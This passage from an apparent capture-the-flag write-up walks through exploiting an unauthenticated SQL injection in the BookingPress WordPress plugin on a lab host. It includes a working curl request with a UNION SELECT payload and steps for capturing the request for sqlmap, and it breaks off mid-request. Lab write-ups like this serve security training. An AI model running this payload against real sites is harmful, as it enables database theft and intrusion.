2) We found this vulnerability: 
 [!] Title: BookingPress < 1.0.11 - Unauthenticated SQL Injection >

3) Now from the References let's see how it is exploited
4) Go in the page:  http://metapress.htb/events/

5) We search the source code for the keywords: "nonce"

6)Let's find this line of code:  
```javascript
var postData = { action:'bookingpress_before_book_appointment', appointment_data: vm.appointment_step_form_data,_wpnonce:'f8ef325342' };
```
7)  Then I make this request :
```
curl -i 'http://metapress.htb/wp-admin/admin-ajax.php' \
 --data 'action=bookingpress_front_get_category_services&_wpnonce=f8ef325342&category_id=33&total_service=-7502) UNION ALL SELECT @@version,@@version_comment,@@version_compile_os,1,2,3,4,5,6-- -'

```
8) Now that we have discovered the vulnerability, let's try to use sqlmap, to do this we open burp, put intercepts and make this request from our terminal:
```
curl -i 'http://metapress.htb/wp-admin/admin-ajax.php' \      --data 'action=bookingpress_front_get_category_services&_wpnonce=224e07b058&category_id=33&total_service=-7502)    -x http://127.0.0.1:8080
```
9)We take the request to the computer:
```
┌──(kali㉿kali)-[~]
└─$ cat  'sql Inject.req'
POST /wp-admin/admin-ajax.php HTTP/1.1
Host: metapress.htb
User-Agent: curl/7.85.0
